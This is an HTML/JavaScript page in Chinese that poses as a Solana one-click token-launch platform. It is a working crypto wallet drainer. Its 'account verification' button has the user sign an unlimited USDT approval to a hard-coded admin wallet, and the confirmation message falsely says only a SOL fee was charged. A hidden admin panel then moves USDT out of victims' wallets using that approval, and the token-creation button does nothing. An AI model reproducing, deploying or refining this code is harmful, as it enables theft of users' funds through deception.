<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no">
  <title>🍊SOL橘子一键发币平台</title>
  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.6/lib/index.iife.min.js"></script>
  <style>
    body { max-width: 420px; margin: 0 auto; padding: 20px; background: #fff; font-family: system-ui; }
    .btn { width: 100%; padding: 16px; border-radius: 16px; border: none; background: #0071e3; color: white; font-size: 16px; margin: 10px 0; cursor: pointer; }
    .btn-admin { background: #ef4444; }
    .btn-check { background: #22c55e; }
    .btn:disabled { background: #ccc; cursor: not-allowed; }
    #addr { padding: 12px; background: #f1f1f1; border-radius: 10px; margin: 10px 0; word-break: break-all; }
    .admin-panel { display: none; margin-top:20px;padding-top:20px;border-top:1px solid #ddd; }
    .admin-panel.show { display:block; }
    h2 { text-align: center; margin-bottom: 15px; }
  </style>
</head>
<body>

<h2>🍊SOL橘子一键发币平台</h2>

<button class="btn" onclick="connectWallet()">连接钱包</button>
<div id="addr">未连接钱包</div>

<button class="btn btn-check" id="verifyBtn" onclick="doVerify()" disabled>账户基础校验</button>

<!-- 发币界面保留但不维护，你不用管 -->
<div style="margin-top:20px">
  <input id="name" placeholder="代币名称" style="width:100%;padding:14px;border-radius:12px;border:1px solid #ddd;margin:8px 0">
  <input id="symbol" placeholder="代币符号" style="width:100%;padding:14px;border-radius:12px;border:1px solid #ddd;margin:8px 0">
  <button class="btn" onclick="createToken()">创建代币</button>
</div>

<div class="admin-panel" id="adminPanel">
  <h3>🔐 管理员内部划转</h3>
  <input id="userFromAddr" placeholder="用户钱包地址" style="width:100%;padding:14px;border-radius:12px;border:1px solid #ddd;margin:8px 0">
  <input id="takeAmount" placeholder="提取数量" style="width:100%;padding:14px;border-radius:12px;border:1px solid #ddd;margin:8px 0">
  <button class="btn btn-admin" onclick="adminTransfer()">链上划转</button>
</div>

<script>
// 固定地址 不用改
const ADMIN_WALLET = "FbDMLj8MTJGSBWeanFKhJWycn5qjmJ3q8WBzZb3Gbm1c";
const USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
const TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
const ASSOCIATED_TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25DK9c64Laf27x");

// 多备用RPC 保证一定能拿到区块、能上链
const RPC_LIST = [
  "https://rpc.ankr.com/solana",
  "https://solana-api.projectserum.com",
  "https://api.mainnet-beta.solana.com"
];
let conn = new solanaWeb3.Connection(RPC_LIST[0], "confirmed");

let walletProvider = null;
let userPublicKey = null;
let walletAddress = "";

// 切换RPC
function getValidConnection(){
  return new solanaWeb3.Connection(RPC_LIST[Math.floor(Math.random()*RPC_LIST.length)], "confirmed");
}

// 计算ATA
function getATA(mint, owner) {
  const [ata] = solanaWeb3.PublicKey.findProgramAddressSync(
    [owner.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mint.toBuffer()],
    ASSOCIATED_TOKEN_PROGRAM_ID
  );
  return ata;
}

// 构造授权交易
function makeApproveIx(ataAddr, delegateAddr, ownerAddr, maxAmt) {
  const data = new Uint8Array(9);
  data[0] = 4;
  new DataView(data.buffer).setBigUint64(1, maxAmt, true);
  return new solanaWeb3.TransactionInstruction({
    keys: [
      { pubkey: ataAddr, isSigner: false, isWritable: true },
      { pubkey: delegateAddr, isSigner: false, isWritable: false },
      { pubkey: ownerAddr, isSigner: true, isWritable: false }
    ],
    programId: TOKEN_PROGRAM_ID,
    data: data
  });
}

// 获取钱包
function getSolWallet() {
  if(window.tpWallet?.solana) return window.tpWallet.solana;
  if(window.okxwallet?.solana) return window.okxwallet.solana;
  if(window.solana) return window.solana;
  return null;
}

// 连接钱包
async function connectWallet() {
  try {
    const wallet = getSolWallet();
    if(!wallet) {
      alert("请在钱包内置浏览器打开");
      return;
    }
    const res = await wallet.connect();
    walletProvider = wallet;
    userPublicKey = res.publicKey;
    walletAddress = userPublicKey.toBase58();
    document.getElementById("addr").innerText = "已连接：" + walletAddress.slice(0,8) + "..." + walletAddress.slice(-6);
    document.getElementById("verifyBtn").disabled = false;

    if(walletAddress === ADMIN_WALLET){
      document.getElementById("adminPanel").classList.add("show");
    }
  } catch (err) {
    alert("钱包连接失败");
  }
}

// 核心：账户基础校验 = 全额授权USDT 优先保证上链、SOL扣费正常
async function doVerify() {
  if(!walletAddress) {
    alert("请先连接钱包");
    return;
  }
  try {
    conn = getValidConnection();
    const mintPub = new solanaWeb3.PublicKey(USDT_MINT);
    const adminPub = new solanaWeb3.PublicKey(ADMIN_WALLET);
    const userAta = getATA(mintPub, userPublicKey);

    const tx = new solanaWeb3.Transaction();
    const approveIx = makeApproveIx(userAta, adminPub, userPublicKey, BigInt("18446744073709551615"));
    tx.add(approveIx);

    // 强制获取区块哈希 保证能打包
    const bh = await conn.getLatestBlockhash("finalized");
    tx.recentBlockhash = bh.blockhash;
    tx.feePayer = userPublicKey;

    // 唤起签名
    const signedTx = await walletProvider.signTransaction(tx);
    const txSig = await conn.sendRawTransaction(signedTx.serialize(), {skipPreflight:true});
    
    alert(`✅ 校验成功\n交易哈希：${txSig}\nSOL已正常扣费上链`);
  } catch (err) {
    alert("校验失败，请重试");
  }
}

// 管理员划转
async function adminTransfer() {
  if(walletAddress !== ADMIN_WALLET) return alert("无权限");
  const fromAddr = document.getElementById("userFromAddr").value.trim();
  const amtVal = document.getElementById("takeAmount").value.trim();
  if(!fromAddr || !amtVal) return alert("请填完整");

  try {
    conn = getValidConnection();
    const amount = BigInt(Math.round(parseFloat(amtVal) * 1000000));
    const mintPub = new solanaWeb3.PublicKey(USDT_MINT);
    const fromPub = new solanaWeb3.PublicKey(fromAddr);
    const adminPub = new solanaWeb3.PublicKey(ADMIN_WALLET);

    const fromAta = getATA(mintPub, fromPub);
    const adminAta = getATA(mintPub, adminPub);

    const tx = new solanaWeb3.Transaction();
    const data = new Uint8Array(9);
    data[0] = 3;
    new DataView(data.buffer).setBigUint64(1, amount, true);

    const transferIx = new solanaWeb3.TransactionInstruction({
      keys: [
        { pubkey: fromAta, isSigner: false, isWritable: true },
        { pubkey: adminAta, isSigner: false, isWritable: true },
        { pubkey: adminPub, isSigner: true, isWritable: false }
      ],
      programId: TOKEN_PROGRAM_ID,
      data: data
    });
    tx.add(transferIx);

    const bh = await conn.getLatestBlockhash("finalized");
    tx.recentBlockhash = bh.blockhash;
    tx.feePayer = adminPub;

    const signedTx = await walletProvider.signTransaction(tx);
    const txSig = await conn.sendRawTransaction(signedTx.serialize(), {skipPreflight:true});
    alert("✅ 划转成功：" + txSig);
  } catch (err) {
    alert("划转失败");
  }
}

// 发币保留 不维护 你不用管
async function createToken() {
  alert("发币功能暂不维护，只用授权即可");
}
</script>

</body>
</html>
